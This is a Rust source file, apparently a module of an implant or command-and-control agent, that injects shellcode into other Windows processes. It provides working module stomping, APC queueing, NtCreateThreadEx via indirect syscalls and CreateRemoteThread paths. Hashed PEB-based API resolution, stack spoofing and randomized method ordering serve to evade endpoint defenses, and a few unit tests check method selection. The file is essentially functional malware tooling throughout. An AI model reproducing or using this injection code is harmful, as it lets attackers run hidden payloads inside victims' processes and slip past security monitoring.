//! Remote process shellcode injection (Windows).
//!
//! Gated by cargo feature `inject` — compiled into **L2 `mod_inject` only**,
//! never into Stage0 `minimal` / `standard` product agents.
//!
//! Primary path: PEB-resolved VirtualAllocEx / WriteProcessMemory / VirtualProtectEx
//! + NtCreateThreadEx (remote) with CreateRemoteThread fallback.
//! All high-risk opens run under stack spoof framing.

use super::process::{close_handle, open_process, wait_for_single_object};
use crate::stealth;

/// PROCESS_CREATE_THREAD | VM_OPERATION | VM_WRITE | VM_READ | QUERY_INFORMATION
const PROCESS_INJECT_ACCESS: u32 = 0x0002 | 0x0008 | 0x0020 | 0x0010 | 0x0400;

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const MEM_RELEASE: u32 = 0x8000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

/// Result of a remote inject attempt.
#[derive(Debug, Clone)]
pub struct InjectResult {
    pub pid: u32,
    pub remote_addr: usize,
    pub thread_handle: usize,
    pub method: &'static str,
}

/// Inject shellcode into target PID and start execution.
///
/// `method`:
/// - `"stomping"` / `"module_stomping"`: overwrite a remote module .text, no new RWX alloc
/// - `"nt"`: prefer NtCreateThreadEx into remote process
/// - `"crt"`: CreateRemoteThread only
/// - `"apc"`: QueueUserAPC to an existing thread in the target (non-classic)
/// - `"auto"` / empty (default): stomping → apc → nt (with soft fallbacks)
pub fn inject_shellcode(pid: u32, shellcode: &[u8], method: &str) -> Result<InjectResult, String> {
    if pid == 0 {
        return Err("invalid pid".into());
    }
    if shellcode.is_empty() {
        return Err("empty payload".into());
    }
    if shellcode.len() > 16 * 1024 * 1024 {
        return Err("payload too large (>16MB)".into());
    }

    crate::stealth::stack::with_spoofed_stack(|| inject_shellcode_inner(pid, shellcode, method))
}

/// Normalize method string for dispatch / tests (real entry used by inject path).
pub fn normalize_inject_method(method: &str) -> &'static str {
    match method.trim().to_ascii_lowercase().as_str() {
        "crt" => "crt",
        "apc" => "apc",
        "nt" => "nt",
        "stomping" | "module_stomping" | "stomp" => "stomping",
        // Default product path: stomping-first auto chain
        "auto" | "" => "auto",
        _ => "auto",
    }
}

/// Default method selection chain (pure; unit-tested).
/// Returns ordered method names tried by `auto` / empty.
pub fn inject_auto_fallback_chain() -> &'static [&'static str] {
    &["stomping", "apc", "nt"]
}

fn inject_shellcode_inner(
    pid: u32,
    shellcode: &[u8],
    method: &str,
) -> Result<InjectResult, String> {
    let h_proc = open_process(pid, PROCESS_INJECT_ACCESS)?;
    let cleanup_proc = |h: usize| {
        let _ = close_handle(h);
    };

    let m = normalize_inject_method(method);

    // Module stomping path (also first step of auto).
    if m == "stomping" || m == "auto" {
        match module_stomp_inject(pid, h_proc, shellcode) {
            Ok(r) => {
                cleanup_proc(h_proc);
                return Ok(r);
            }
            Err(e) => {
                if m == "stomping" {
                    cleanup_proc(h_proc);
                    return Err(e);
                }
                // auto: fall through to apc → nt via classic alloc path
            }
        }
    }

    let remote = match remote_alloc_write(h_proc, shellcode) {
        Ok(a) => a,
        Err(e) => {
            cleanup_proc(h_proc);
            return Err(e);
        }
    };

    // Prefer RX after write (RWX only as fallback)
    if let Err(e) = remote_protect(h_proc, remote, shellcode.len(), PAGE_EXECUTE_READ) {
        // Fallback RWX if RX fails (some targets)
        if remote_protect(h_proc, remote, shellcode.len(), PAGE_EXECUTE_READWRITE).is_err() {
            let _ = remote_free(h_proc, remote);
            cleanup_proc(h_proc);
            return Err(format!("VirtualProtectEx failed: {e}"));
        }
    }

    let (thread, used) = match m {
        "crt" => match create_remote_thread(h_proc, remote) {
            Ok(t) => (t, "crt"),
            Err(e) => {
                let _ = remote_free(h_proc, remote);
                cleanup_proc(h_proc);
                return Err(e);
            }
        },
        "apc" => match queue_user_apc_inject(pid, h_proc, remote) {
            Ok(t) => (t, "apc"),
            Err(e) => {
                let _ = remote_free(h_proc, remote);
                cleanup_proc(h_proc);
                return Err(e);
            }
        },
        "nt" => {
            // 50/50 order: NtCreateThreadEx first vs CreateRemoteThread first.
            let prefer_nt = crate::utils::random_range(0, 1) == 0;
            let result = if prefer_nt {
                nt_create_remote_thread(h_proc, remote)
                    .map(|t| (t, "nt"))
                    .or_else(|e| {
                        create_remote_thread(h_proc, remote)
                            .map(|t| (t, "crt-fallback"))
                            .map_err(|e2| format!("NtCreateThreadEx: {e}; CreateRemoteThread: {e2}"))
                    })
            } else {
                create_remote_thread(h_proc, remote)
                    .map(|t| (t, "crt"))
                    .or_else(|e| {
                        nt_create_remote_thread(h_proc, remote)
                            .map(|t| (t, "nt-fallback"))
                            .map_err(|e2| format!("CreateRemoteThread: {e}; NtCreateThreadEx: {e2}"))
                    })
            };
            match result {
                Ok(v) => v,
                Err(e) => {
                    let _ = remote_free(h_proc, remote);
                    cleanup_proc(h_proc);
                    return Err(e);
                }
            }
        },
        _ => {
            // auto after stomping failed: apc first, then randomized nt/crt order
            if let Ok(t) = queue_user_apc_inject(pid, h_proc, remote) {
                (t, "apc")
            } else {
                let prefer_nt = crate::utils::random_range(0, 1) == 0;
                let chain_ok = if prefer_nt {
                    nt_create_remote_thread(h_proc, remote)
                        .map(|t| (t, "nt"))
                        .or_else(|_| {
                            create_remote_thread(h_proc, remote).map(|t| (t, "crt"))
                        })
                } else {
                    create_remote_thread(h_proc, remote)
                        .map(|t| (t, "crt"))
                        .or_else(|_| {
                            nt_create_remote_thread(h_proc, remote).map(|t| (t, "nt"))
                        })
                };
                match chain_ok {
                    Ok(v) => v,
                    Err(_) => {
                        let _ = remote_free(h_proc, remote);
                        cleanup_proc(h_proc);
                        return Err(
                            "stomping, apc, nt, and crt remote execution paths failed".into(),
                        );
                    }
                }
            }
        }
    };

    // Do not wait forever — operator can choose wait via module payload.
    // Close process handle; leave thread handle to caller (module closes).
    cleanup_proc(h_proc);

    Ok(InjectResult {
        pid,
        remote_addr: remote,
        thread_handle: thread,
        method: used,
    })
}

/// Candidate remote module region for stomping (unit-testable selection rules).
#[derive(Debug, Clone)]
pub struct StompCandidate {
    pub module_base: usize,
    pub text_rva: u32,
    pub text_size: usize,
    pub name_hint: &'static str,
}

/// Whether a module name is a safe stomping target (skip critical system images).
pub fn stomp_module_name_ok(name_utf16_or_ascii: &str) -> bool {
    let n = name_utf16_or_ascii.to_ascii_lowercase();
    let base = n.rsplit(['\\', '/']).next().unwrap_or(&n);
    // Never stomp these — process death / loader breakage.
    const SKIP: &[&str] = &[
        "ntdll.dll",
        "kernel32.dll",
        "kernelbase.dll",
        "user32.dll",
        "gdi32.dll",
        "win32u.dll",
        "wow64.dll",
        "wow64cpu.dll",
        "wow64win.dll",
    ];
    if SKIP.iter().any(|s| base == *s) {
        return false;
    }
    base.ends_with(".dll") || base.ends_with(".exe")
}

/// Pick best stomping region from PE section table (first RX section large enough).
pub fn pick_stomp_text_section(
    image_base: usize,
    sections: &[(
        u32, /* rva */
        u32, /* vsize */
        u32, /* chars */
    )],
    shellcode_len: usize,
) -> Option<StompCandidate> {
    const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
    for &(rva, vsize, chars) in sections {
        if (chars & IMAGE_SCN_MEM_EXECUTE) == 0 {
            continue;
        }
        let sz = vsize as usize;
        if sz >= shellcode_len && rva != 0 {
            return Some(StompCandidate {
                module_base: image_base,
                text_rva: rva,
                text_size: sz,
                name_hint: ".text",
            });
        }
    }
    None
}

/// Module stomping: write shellcode over a remote module RX section; start thread there.
fn module_stomp_inject(pid: u32, h_proc: usize, shellcode: &[u8]) -> Result<InjectResult, String> {
    let candidate = find_remote_stomp_candidate(pid, h_proc, shellcode.len())?;
    let remote = candidate
        .module_base
        .wrapping_add(candidate.text_rva as usize);

    // RW → write → RX (never leave RWX)
    remote_protect(h_proc, remote, shellcode.len(), PAGE_READWRITE)
        .map_err(|e| format!("stomp VirtualProtectEx RW: {e}"))?;
    remote_write(h_proc, remote, shellcode)
        .map_err(|e| format!("stomp WriteProcessMemory: {e}"))?;
    if remote_protect(h_proc, remote, shellcode.len(), PAGE_EXECUTE_READ).is_err() {
        let _ = remote_protect(h_proc, remote, shellcode.len(), PAGE_EXECUTE_READWRITE);
    }

    let thread = nt_create_remote_thread(h_proc, remote)
        .or_else(|_| create_remote_thread(h_proc, remote))
        .map_err(|e| format!("stomp thread: {e}"))?;

    Ok(InjectResult {
        pid,
        remote_addr: remote,
        thread_handle: thread,
        method: "stomping",
    })
}

fn remote_write(h_proc: usize, addr: usize, data: &[u8]) -> Result<(), String> {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        type WriteProcessMemoryFn =
            unsafe extern "system" fn(usize, *mut u8, *const u8, usize, *mut usize) -> i32;
        let wpm: WriteProcessMemoryFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"WriteProcessMemory"))
                .ok_or("WriteProcessMemory unresolved")?,
        );
        let mut written = 0usize;
        let ok = wpm(
            h_proc,
            addr as *mut u8,
            data.as_ptr(),
            data.len(),
            &mut written,
        );
        if ok == 0 || written != data.len() {
            return Err(format!("written={written}/{}", data.len()));
        }
        Ok(())
    }
}

fn remote_read(h_proc: usize, addr: usize, buf: &mut [u8]) -> Result<(), String> {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        type ReadProcessMemoryFn =
            unsafe extern "system" fn(usize, *const u8, *mut u8, usize, *mut usize) -> i32;
        let rpm: ReadProcessMemoryFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"ReadProcessMemory"))
                .ok_or("ReadProcessMemory unresolved")?,
        );
        let mut n = 0usize;
        let ok = rpm(
            h_proc,
            addr as *const u8,
            buf.as_mut_ptr(),
            buf.len(),
            &mut n,
        );
        if ok == 0 || n != buf.len() {
            return Err(format!("read {n}/{}", buf.len()));
        }
        Ok(())
    }
}

/// Enumerate remote modules; pick first allowable DLL with large enough .text.
fn find_remote_stomp_candidate(
    pid: u32,
    h_proc: usize,
    shellcode_len: usize,
) -> Result<StompCandidate, String> {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        if k32 == 0 {
            return Err("kernel32 missing".into());
        }

        #[repr(C)]
        struct ModuleEntry32W {
            dw_size: u32,
            th32_module_id: u32,
            th32_process_id: u32,
            glblcnt_usage: u32,
            proccnt_usage: u32,
            mod_base_addr: usize,
            mod_base_size: u32,
            h_module: usize,
            sz_module: [u16; 256],
            sz_exe_path: [u16; 260],
        }

        type CreateToolhelp32SnapshotFn = unsafe extern "system" fn(u32, u32) -> usize;
        type Module32FirstWFn = unsafe extern "system" fn(usize, *mut ModuleEntry32W) -> i32;
        type Module32NextWFn = unsafe extern "system" fn(usize, *mut ModuleEntry32W) -> i32;
        type CloseHandleFn = unsafe extern "system" fn(usize) -> i32;

        let snap_fn: CreateToolhelp32SnapshotFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"CreateToolhelp32Snapshot"))
                .ok_or("CreateToolhelp32Snapshot")?,
        );
        let first: Module32FirstWFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"Module32FirstW"))
                .ok_or("Module32FirstW")?,
        );
        let next: Module32NextWFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"Module32NextW"))
                .ok_or("Module32NextW")?,
        );
        let close_h: CloseHandleFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"CloseHandle"))
                .ok_or("CloseHandle")?,
        );

        const TH32CS_SNAPMODULE: u32 = 0x0000_0008;
        const TH32CS_SNAPMODULE32: u32 = 0x0000_0010;
        let snap = snap_fn(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
        if snap == 0 || snap == usize::MAX {
            return Err("Module snapshot failed".into());
        }

        let mut me: ModuleEntry32W = std::mem::zeroed();
        me.dw_size = std::mem::size_of::<ModuleEntry32W>() as u32;
        let mut ok = first(snap, &mut me);
        let mut last_err = "no suitable module for stomping".to_string();

        while ok != 0 {
            let name = {
                let nul = me
                    .sz_module
                    .iter()
                    .position(|&c| c == 0)
                    .unwrap_or(me.sz_module.len());
                String::from_utf16_lossy(&me.sz_module[..nul])
            };
            if stomp_module_name_ok(&name) && me.mod_base_addr != 0 {
                match parse_remote_text_section(h_proc, me.mod_base_addr, shellcode_len) {
                    Ok(c) => {
                        let _ = close_h(snap);
                        return Ok(c);
                    }
                    Err(e) => last_err = format!("{name}: {e}"),
                }
            }
            me.dw_size = std::mem::size_of::<ModuleEntry32W>() as u32;
            ok = next(snap, &mut me);
        }
        let _ = close_h(snap);
        Err(last_err)
    }
}

fn parse_remote_text_section(
    h_proc: usize,
    base: usize,
    shellcode_len: usize,
) -> Result<StompCandidate, String> {
    let mut dos = [0u8; 64];
    remote_read(h_proc, base, &mut dos)?;
    if dos[0] != b'M' || dos[1] != b'Z' {
        return Err("not MZ".into());
    }
    let e_lfanew = u32::from_le_bytes([dos[0x3C], dos[0x3D], dos[0x3E], dos[0x3F]]) as usize;
    if e_lfanew == 0 || e_lfanew > 0x1000 {
        return Err("bad e_lfanew".into());
    }
    // NT headers: Signature(4) + FileHeader(20) + OptionalHeader
    let mut nt_prefix = [0u8; 4 + 20 + 2]; // through Magic
    remote_read(h_proc, base + e_lfanew, &mut nt_prefix)?;
    if &nt_prefix[0..4] != b"PE\0\0" {
        return Err("not PE".into());
    }
    let num_sections = u16::from_le_bytes([nt_prefix[6], nt_prefix[7]]) as usize;
    let size_opt = u16::from_le_bytes([nt_prefix[20], nt_prefix[21]]) as usize;
    if num_sections == 0 || num_sections > 96 {
        return Err("bad section count".into());
    }
    let sec_off = e_lfanew + 4 + 20 + size_opt;
    let mut sections: Vec<(u32, u32, u32)> = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let mut sec = [0u8; 40];
        remote_read(h_proc, base + sec_off + i * 40, &mut sec)?;
        // VirtualSize @ 8, VirtualAddress @ 12, Characteristics @ 36
        let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]);
        let rva = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]);
        let chars = u32::from_le_bytes([sec[36], sec[37], sec[38], sec[39]]);
        sections.push((rva, vsize, chars));
    }
    pick_stomp_text_section(base, &sections, shellcode_len)
        .ok_or_else(|| "no RX section large enough".into())
}

/// Optional wait on remote thread (ms). 0 = no wait.
pub fn wait_inject_thread(thread_handle: usize, timeout_ms: u32) -> i32 {
    if thread_handle == 0 {
        return -1;
    }
    if timeout_ms == 0 {
        let _ = close_handle(thread_handle);
        return 0;
    }
    // NtWait with timeout is complex; use WaitForSingleObject PEB
    let status = unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        if let Some(addr) =
            stealth::get_api_addr(k32, stealth::hash_api_name(b"WaitForSingleObject"))
        {
            type WaitFn = unsafe extern "system" fn(usize, u32) -> u32;
            let wait: WaitFn = std::mem::transmute(addr);
            wait(thread_handle, timeout_ms) as i32
        } else {
            wait_for_single_object(thread_handle)
        }
    };
    let _ = close_handle(thread_handle);
    status
}

fn remote_alloc_write(h_proc: usize, data: &[u8]) -> Result<usize, String> {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        if k32 == 0 {
            return Err("kernel32 not found".into());
        }
        type VirtualAllocExFn =
            unsafe extern "system" fn(usize, *mut u8, usize, u32, u32) -> *mut u8;
        type WriteProcessMemoryFn =
            unsafe extern "system" fn(usize, *mut u8, *const u8, usize, *mut usize) -> i32;

        let va: VirtualAllocExFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"VirtualAllocEx"))
                .ok_or("VirtualAllocEx unresolved")?,
        );
        let wpm: WriteProcessMemoryFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"WriteProcessMemory"))
                .ok_or("WriteProcessMemory unresolved")?,
        );

        let base = va(
            h_proc,
            std::ptr::null_mut(),
            data.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if base.is_null() {
            return Err("VirtualAllocEx returned NULL".into());
        }
        let mut written: usize = 0;
        let ok = wpm(h_proc, base, data.as_ptr(), data.len(), &mut written);
        if ok == 0 || written != data.len() {
            let _ = remote_free(h_proc, base as usize);
            return Err(format!(
                "WriteProcessMemory failed (written={written}/{})",
                data.len()
            ));
        }
        Ok(base as usize)
    }
}

fn remote_protect(h_proc: usize, addr: usize, size: usize, prot: u32) -> Result<(), String> {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        type VirtualProtectExFn =
            unsafe extern "system" fn(usize, *mut u8, usize, u32, *mut u32) -> i32;
        let vp: VirtualProtectExFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"VirtualProtectEx"))
                .ok_or("VirtualProtectEx unresolved")?,
        );
        let mut old: u32 = 0;
        let ok = vp(h_proc, addr as *mut u8, size, prot, &mut old);
        if ok == 0 {
            return Err("VirtualProtectEx failed".into());
        }
        Ok(())
    }
}

fn remote_free(h_proc: usize, addr: usize) -> i32 {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        type VirtualFreeExFn = unsafe extern "system" fn(usize, *mut u8, usize, u32) -> i32;
        if let Some(a) = stealth::get_api_addr(k32, stealth::hash_api_name(b"VirtualFreeEx")) {
            let vf: VirtualFreeExFn = std::mem::transmute(a);
            return vf(h_proc, addr as *mut u8, 0, MEM_RELEASE);
        }
    }
    0
}

fn create_remote_thread(h_proc: usize, start: usize) -> Result<usize, String> {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        type CreateRemoteThreadFn = unsafe extern "system" fn(
            usize,
            *mut u8,
            usize,
            usize,
            *mut u8,
            u32,
            *mut u32,
        ) -> usize;
        let crt: CreateRemoteThreadFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"CreateRemoteThread"))
                .ok_or("CreateRemoteThread unresolved")?,
        );
        let h = crt(
            h_proc,
            std::ptr::null_mut(),
            0,
            start,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );
        if h == 0 {
            return Err("CreateRemoteThread returned NULL".into());
        }
        Ok(h)
    }
}

/// QueueUserAPC to first enumerable thread in `pid` (non-classic vs CreateRemoteThread).
/// Returns thread handle used for APC (caller may close via wait_inject_thread).
fn queue_user_apc_inject(pid: u32, _h_proc: usize, start: usize) -> Result<usize, String> {
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        if k32 == 0 {
            return Err("kernel32 not found for apc".into());
        }
        type CreateToolhelp32SnapshotFn = unsafe extern "system" fn(u32, u32) -> usize;
        type Thread32FirstFn = unsafe extern "system" fn(usize, *mut ThreadEntry32) -> i32;
        type Thread32NextFn = unsafe extern "system" fn(usize, *mut ThreadEntry32) -> i32;
        type OpenThreadFn = unsafe extern "system" fn(u32, i32, u32) -> usize;
        type QueueUserAPCFn = unsafe extern "system" fn(usize, usize, usize) -> u32;
        type CloseHandleFn = unsafe extern "system" fn(usize) -> i32;

        #[repr(C)]
        struct ThreadEntry32 {
            dw_size: u32,
            cnt_usage: u32,
            th32_thread_id: u32,
            th32_owner_process_id: u32,
            tp_base_pri: i32,
            tp_delta_pri: i32,
            dw_flags: u32,
        }

        let snap_fn: CreateToolhelp32SnapshotFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"CreateToolhelp32Snapshot"))
                .ok_or("CreateToolhelp32Snapshot unresolved")?,
        );
        let first: Thread32FirstFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"Thread32First"))
                .ok_or("Thread32First unresolved")?,
        );
        let next: Thread32NextFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"Thread32Next"))
                .ok_or("Thread32Next unresolved")?,
        );
        let open_thread: OpenThreadFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"OpenThread"))
                .ok_or("OpenThread unresolved")?,
        );
        let queue_apc: QueueUserAPCFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"QueueUserAPC"))
                .ok_or("QueueUserAPC unresolved")?,
        );
        let close_h: CloseHandleFn = std::mem::transmute(
            stealth::get_api_addr(k32, stealth::hash_api_name(b"CloseHandle"))
                .ok_or("CloseHandle unresolved")?,
        );

        const TH32CS_SNAPTHREAD: u32 = 0x0000_0004;
        // THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION
        const THREAD_APC_ACCESS: u32 = 0x0010 | 0x0002 | 0x0040;

        let snap = snap_fn(TH32CS_SNAPTHREAD, 0);
        if snap == 0 || snap == usize::MAX {
            return Err("CreateToolhelp32Snapshot failed".into());
        }

        let mut te = ThreadEntry32 {
            dw_size: std::mem::size_of::<ThreadEntry32>() as u32,
            cnt_usage: 0,
            th32_thread_id: 0,
            th32_owner_process_id: 0,
            tp_base_pri: 0,
            tp_delta_pri: 0,
            dw_flags: 0,
        };

        let mut ok_first = first(snap, &mut te);
        while ok_first != 0 {
            if te.th32_owner_process_id == pid && te.th32_thread_id != 0 {
                let h_thread = open_thread(THREAD_APC_ACCESS, 0, te.th32_thread_id);
                if h_thread != 0 {
                    // QueueUserAPC(pfnAPC, hThread, dwData) — shellcode as APC routine
                    let q = queue_apc(start, h_thread, 0);
                    if q != 0 {
                        let _ = close_h(snap);
                        return Ok(h_thread);
                    }
                    let _ = close_h(h_thread);
                }
            }
            te.dw_size = std::mem::size_of::<ThreadEntry32>() as u32;
            ok_first = next(snap, &mut te);
        }
        let _ = close_h(snap);
        Err("QueueUserAPC: no suitable target thread".into())
    }
}

#[cfg(test)]
mod inject_method_tests {
    use super::{normalize_inject_method, pick_stomp_text_section, stomp_module_name_ok};

    #[test]
    fn apc_and_stomping_methods_are_recognized() {
        assert_eq!(normalize_inject_method("apc"), "apc");
        assert_eq!(normalize_inject_method("APC"), "apc");
        assert_eq!(normalize_inject_method("nt"), "nt");
        assert_eq!(normalize_inject_method("crt"), "crt");
        assert_eq!(normalize_inject_method("auto"), "auto");
        assert_eq!(normalize_inject_method(""), "auto");
        assert_eq!(normalize_inject_method("stomping"), "stomping");
        assert_eq!(normalize_inject_method("module_stomping"), "stomping");
        assert_eq!(normalize_inject_method("STOMP"), "stomping");
        assert_ne!(
            normalize_inject_method("stomping"),
            normalize_inject_method("apc")
        );
        assert_ne!(
            normalize_inject_method("stomping"),
            normalize_inject_method("nt")
        );
    }

    #[test]
    fn auto_fallback_chain_is_stomping_first() {
        let chain = super::inject_auto_fallback_chain();
        assert_eq!(chain[0], "stomping");
        assert!(chain.contains(&"apc"));
        assert!(chain.contains(&"nt"));
        assert_eq!(chain.len(), 3);
    }

    #[test]
    fn stomp_skips_critical_system_modules() {
        assert!(!stomp_module_name_ok("ntdll.dll"));
        assert!(!stomp_module_name_ok("C:\\Windows\\System32\\KERNEL32.DLL"));
        assert!(!stomp_module_name_ok("kernelbase.dll"));
        assert!(stomp_module_name_ok("version.dll"));
        assert!(stomp_module_name_ok("C:\\app\\plugin.dll"));
    }

    #[test]
    fn pick_stomp_text_prefers_executable_section() {
        // (rva, vsize, chars) — IMAGE_SCN_MEM_EXECUTE = 0x20000000
        let secs = [
            (0x1000u32, 0x200u32, 0x4000_0000),  // rdata-like, not exec
            (0x2000u32, 0x1000u32, 0x6000_0020), // .text exec
            (0x4000u32, 0x100u32, 0x2000_0000),  // small exec
        ];
        let c = pick_stomp_text_section(0x7FF0_0000, &secs, 0x100).expect("text");
        assert_eq!(c.text_rva, 0x2000);
        assert_eq!(c.module_base, 0x7FF0_0000);
        assert!(c.text_size >= 0x100);
        assert!(pick_stomp_text_section(0x1000, &secs, 0x5000).is_none());
    }
}

fn nt_create_remote_thread(h_proc: usize, start: usize) -> Result<usize, String> {
    let mut thread_handle: usize = 0;
    let desired_access: u32 = 0x1F_FFFF;
    let create_flags: u32 = 0;
    let status = unsafe {
        crate::syscalls::indirect_syscall(
            stealth::hash_api_name(b"NtCreateThreadEx"),
            &[
                &mut thread_handle as *mut usize as usize,
                desired_access as usize,
                0,
                h_proc,
                start,
                0,
                create_flags as usize,
                0,
                0,
                0,
                0,
            ],
        )
    };
    if status >= 0 && thread_handle != 0 {
        return Ok(thread_handle);
    }
    // ntdll D/Invoke fallback
    unsafe {
        let ntdll = stealth::get_module_base(stealth::hash_module_name(b"ntdll.dll"));
        if let Some(addr) =
            stealth::get_api_addr(ntdll, stealth::hash_api_name(b"NtCreateThreadEx"))
        {
            type NtCreateThreadExFn = unsafe extern "system" fn(
                *mut usize,
                u32,
                usize,
                usize,
                usize,
                usize,
                u32,
                usize,
                usize,
                usize,
                usize,
            ) -> i32;
            let f: NtCreateThreadExFn = std::mem::transmute(addr);
            let mut th: usize = 0;
            let st = f(
                &mut th,
                desired_access,
                0,
                h_proc,
                start,
                0,
                create_flags,
                0,
                0,
                0,
                0,
            );
            if st >= 0 && th != 0 {
                return Ok(th);
            }
            return Err(format!("NtCreateThreadEx status 0x{:08X}", st as u32));
        }
    }
    Err(format!(
        "NtCreateThreadEx failed status 0x{:08X}",
        status as u32
    ))
}
